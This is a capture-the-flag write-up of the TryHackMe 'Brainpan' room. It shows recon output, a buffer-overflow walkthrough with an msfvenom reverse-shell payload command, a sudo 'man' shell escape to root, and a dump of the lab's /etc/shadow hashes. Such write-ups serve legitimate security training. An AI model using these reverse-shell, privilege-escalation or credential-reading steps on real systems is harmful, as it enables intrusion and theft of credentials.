---
title: "Tryhackme writeup: Brainpan"
date: 2021-04-21T20:37:01-05:00
draft: false
toc: true
categories: ["buffer overflow","writeups","ctf","tryhackme"]
thumbnail: writeups-reports/files/brainpan-thumbnail.PNG
---

Brainpan is part of the "Offensive Pentesting Path" in TryHackMe, and it is a straight-forward **buffer overflow** activity with further extra steps to achieve full **privilege escalation**.

<!--more-->

Note: This writeup doesn't explain with full detail the whole exploitation process, and will skip a couple steps, but it serves as a "nudge" to the right direction when attempting this room.

## Initial Recon

For system enumeration I used threader3000, finding ports 9999 and 10000 open. [^1]

	------------------------------------------------------------
			Threader 3000 - Multi-threaded Port Scanner          
							Version 1.0.6                    
						A project by The Mayor               
	------------------------------------------------------------
	Enter your target IP address or URL here: 10.10.46.162
	------------------------------------------------------------
	Scanning target 10.10.46.162
	Time started: 2021-04-14 11:22:05.886060
	------------------------------------------------------------
	Port 9999 is open
	Port 10000 is open
	Port scan completed in 0:01:13.861727
	------------------------------------------------------------
	Threader3000 recommends the following Nmap scan:
	************************************************************
	nmap -p9999,10000 -sV -sC -T4 -Pn -oA 10.10.46.162 10.10.46.162
	************************************************************
	Would you like to run Nmap or quit to terminal?
	------------------------------------------------------------
	1 = Run suggested Nmap scan
	2 = Run another Threader3000 scan
	3 = Exit to terminal
	------------------------------------------------------------
	Option Selection: 1
	nmap -p9999,10000 -sV -sC -Pn -T4 -oA 10.10.46.162 10.10.46.162
	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 11:23 EDT
	Nmap scan report for 10.10.46.162
	Host is up (0.19s latency).

	PORT      STATE SERVICE VERSION
	9999/tcp  open  abyss?
	| fingerprint-strings:
	|   NULL:
	|     _| _|
	|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
	|     _|_| _| _| _| _| _| _| _| _| _| _| _|
	|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
	|     [________________________ WELCOME TO BRAINPAN _________________________]
	|_    ENTER THE PASSWORD
	10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
	|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
	|_http-title: Site doesn't have a title (text/html).
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port9999-TCP:V=7.91%I=7%D=4/14%Time=6077091E%P=x86_64-pc-linux-gnu%r(NU
	SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
	SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
	SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
	SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
	SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
	SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
	SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
	SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
	SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
	SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
	SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
	SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
	SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
	SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
	SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
	SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
	SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
	SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
	SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
	SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
	SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
	SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
	SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
	SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
	SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
	SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
	SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
	SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
	SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 94.31 seconds
	------------------------------------------------------------
	Combined scan completed in 0:03:01.978867
	Press enter to quit...

Port 9999 is apparently running a remote vulnserver-like application. We can connect to it with

	kali@kali:~/threader3000$ nc 10.10.46.162 9999)

	_| _|
	_|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
	_|_| _| _| _| _| _| _| _| _| _| _| _|
	_|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
	[________________________ WELCOME TO BRAINPAN _________________________]
		ENTER THE PASSWORD _

Port 10000 is running a python http server. Navigating to it, we see a display page at the main folder, but there was nothing worthy of our attention at http://10.10.46.162:10000. So, after running a directory fuzzing with gobuster, we found the folder "/bin".

	kali@kali:~/threader3000$ gobuster dir -u http://10.10.46.162:10000/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	===============================================================
	Gobuster v3.0.1
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
	===============================================================
	[+] Url:            http://10.10.46.162:10000/
	[+] Threads:        10
	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Status codes:   200,204,301,302,307,401,403
	[+] User Agent:     gobuster/3.0.1
	[+] Timeout:        10s
	===============================================================
	2021/04/14 11:29:25 Starting gobuster
	===============================================================
	/bin (Status: 301)

Navigating, then, to http://10.10.46.162:10000/bin, we have access to a folder containing "brainpan.exe" binary, which we'll download for local examination in a Windows box (Or in our Kali box if we had wine + Immunity Debugger set up)

## Buffer Overflow

I highly recommend checking Tib3rius' Buffer Overflow prep @ https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst if you've never done this before.

After some basic **fuzzing** we found the offset: 524 bytes, succesfully overwriting the EIP. Now let's find our **bad characters**.

For this, sometimes I like to do it manually (Although it's time consuming and error-prone) by looking at the stack once the full range of characters were sent, just by:

- Right clicking on the ESP pointer at the Immunity debugger interface ("CPU thread" window)-> "Follow in dump"
- At the addresses section, looking at all the characters sent. If we see a "jump", for example,
	`01 02 03 00 AB 06 07` (etc.)
- We know that at least \x04 is a bad character. We should repeat the process again because this is no guarantee that "\x05" is also a Badchar (I've found the testing programs sometimes mess with more than one byte when encountering a badchar).

	*I had to check 3 times for the ESP overwriting because I was doubtful that there were no bad chars in this exercise. Around ~ 5 minutes of glancing through the addresses from the start of the ESP all the way to the last 255th byte (That's why we should, under high-pressure situations, use tools like "mona").*

Now we know we can safely generate our shellcode and overwrite our stack with it. But first we need to find our `jmp esp` instruction

We can also use "mona" to find it automatically, but in this case I did it manually with objdump:

	kali@kali:~/CTF/brainpan$ objdump -d -M intel brainpan.exe | grep "jmp    esp"
	311712f3:	ff e4                	jmp    esp

Considering the "Endianness" of our remote system, we arrange our address in reverse byte-order:

`311712f3 -> f3,12,17,31 -> \xf3\x12\x17\x31` That's exactly where we are telling the instruction pointer (EIP) to go. And if we successfully overwrite the stack, then it should begin executing our shellcode.

**Generating a shellcode** for a reverse shell with **msfvenom**

	msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=LISTENING_PORT EXITFUNC=thread -b "\x00" -f c

We then get a full shellcode, with the format "\xde\xad\xbe\xef". That's our payload, which we should use to "overflow" the stack, after our **jmp esp** instruction (`\xf3\x12\x17\x31`).

The process for local and remote exploitation are the same, so I'll jump right into the remote **exploitation** phase:

Having our remote server ready running brainpan.exe, we can then send our payload (Don't forget to generate a different shellcode for local/remote exploitation), while listening with Netcat at our desired port.

	$ nc -lp 6666

After running our exploit, we "catched" a reverse shell remotely. Boom!

## Access to the machine

![wine shell](/notebooks/files/wine_shell.png)

🤨 What??

It looks strange, but remember the server is a Linux system, and the brainpan.exe is, well, a Windows executable. So we're in a shell under the "wine" framework.

**¯\\\_(ツ)_/¯**


## Privilege escalation

We spawn a shell to avoid using the "wine" shell, which we are under (Inception):

	/bin/sh -i

Some initial information gathering, rendered something interesting right away:

	whoami
	puck

	id
	uid=1002(puck) gid=1002(puck) groups=1002(puck)

	sudo -l
	Matching Defaults entries for puck on this host:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User puck may run the following commands on this host:
		(root) NOPASSWD: /home/anansi/bin/anansi_util

Remember, we are logged as "**puck**", so we don't have access to **/home/anansi**. However, can see a program there that we can use via **sudo**.

About this program "anansi_util":

	$ sudo /home/anansi/bin/anansi_util
	Usage: /home/anansi/bin/anansi_util [action]
	Where [action] is one of:
		- network
		- proclist
		- manual [command]

We're under "wine", and spawning a shell this was very ~~annoying~~ unstable, so we call again a **reverse shell** with python, and "catching it" with the attack machine (Yes, a Yo-yo shell). (Also, all privilege escalation attempts were impossible without a tty shell).

After some testing, we see something interesting about "manual" (Which runs the "man" command, or "manual" pages).

It turns out, we can spawn a shell inside "man":

	puck@brainpan:~$ sudo -l
	sudo -l
	Matching Defaults entries for puck on this host:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User puck may run the following commands on this host:
		(root) NOPASSWD: /home/anansi/bin/anansi_util

	puck@brainpan:~$ sudo /home/anansi/bin/anansi_util manual man
	sudo /home/anansi/bin/anansi_util manual man
	No manual entry for manual
	WARNING: terminal is not fully functional
	-  (press RETURN)!bash
	!bash
	root@brainpan:/usr/share/man#

	root@brainpan:/root# whoami
	whoami
	Root

It worked, because when calling "man man", we're prompted for "RETURN" or "quit", and we can simply call "!/bin/bash" instead to spawn a shell, and since "man" is ran with superuser privileges, they don't get dropped and we've successfully leveraged "man" to escalate privileges. It's a weird privilege escalation technique, and remember, we're still using "man" so it is kept running until we exit from the root shell.

## Alternative way to attempt privesc

Also, we can read any privileged file in this case with "man", like this:

	$ sudo /home/anansi/bin/anansi_util manual /etc/shadow
	/usr/bin/man: manual-/etc/shadow: No such file or directory
	/usr/bin/man: manual_/etc/shadow: No such file or directory
	No manual entry for manual
	<standard input>:1: warning [p 1, 0.0i]: cannot adjust line
	<standard input>:1: warning [p 1, 0.2i]: cannot adjust line
	<standard input>:22: warning [p 1, 2.2i]: cannot adjust line
	<standard input>:23: warning [p 1, 2.3i]: cannot adjust line
	<standard input>:23: warning [p 1, 2.5i]: cannot adjust line
	<standard input>:23: warning [p 1, 2.7i]: cannot adjust line
	<standard input>:24: warning [p 1, 3.0i]: cannot adjust line
	<standard input>:24: warning [p 1, 3.2i]: can't break line
	root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO‐
	hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa‐
	Dioh0:15768:0:99999:7:::              daemon:*:15768:0:99999:7:::
	bin:*:15768:0:99999:7:::                 sys:*:15768:0:99999:7:::
	sync:*:15768:0:99999:7:::              games:*:15768:0:99999:7:::
	man:*:15768:0:99999:7:::                  lp:*:15768:0:99999:7:::
	mail:*:15768:0:99999:7:::               news:*:15768:0:99999:7:::
	uucp:*:15768:0:99999:7:::   proxy:*:15768:0:99999:7:::    www‐da‐
	ta:*:15768:0:99999:7:::               backup:*:15768:0:99999:7:::
	list:*:15768:0:99999:7:::                irc:*:15768:0:99999:7:::
	gnats:*:15768:0:99999:7:::    nobody:*:15768:0:99999:7:::   libu‐
	uid:!:15768:0:99999:7:::   syslog:*:15768:0:99999:7:::   message‐
	bus:*:15768:0:99999:7:::         reynard:$6$h54J.qxd$yL5md3J4dON‐
	wNl.36iA.mkcabQqRMmeZ0VFKxIVpX‐
	eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::
	anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv‐
	Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly‐
	DGIPE1:15768:0:99999:7:::    puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm‐
	bIcBF9Oi7q2eAi0TMMqO‐
	hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::

A little bit messy, but with a proper tty shell we should be able to retrieve those hashes and crack them!

That's it for this room, we achieved full control of the system, and learned a couple cool techniques along the way.

**There was no flag to secure in this room.**

[^1]: https://github.com/dievus/threader3000
